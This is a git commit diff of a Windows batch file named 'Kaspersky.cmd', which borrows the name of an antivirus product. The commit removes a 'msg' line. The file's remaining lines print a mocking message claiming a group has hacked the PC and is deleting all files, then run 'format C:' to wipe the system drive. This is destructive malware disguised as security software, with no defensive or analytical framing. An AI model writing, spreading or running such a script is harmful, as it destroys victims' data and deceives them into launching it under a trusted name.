fdded1dded4175d4e36cb9632359483015715411
KricsU <164585334+KricsU@users.noreply.github.com>
2024-03-24 22:06:43 -0700

    Update Kaspersky.cmd

--- Kaspersky.cmd
+++ Kaspersky.cmd
@@ -7,6 +7,5 @@ cls
 echo  -Oops! your files being deleted
 echo  -What happened? BlackBastardsX hacked your pc and now we are deleting all of the files (ransomware)
 echo  -What can i do? Nothing
-msg * Suicide Explorer
 @echo off
 format C:
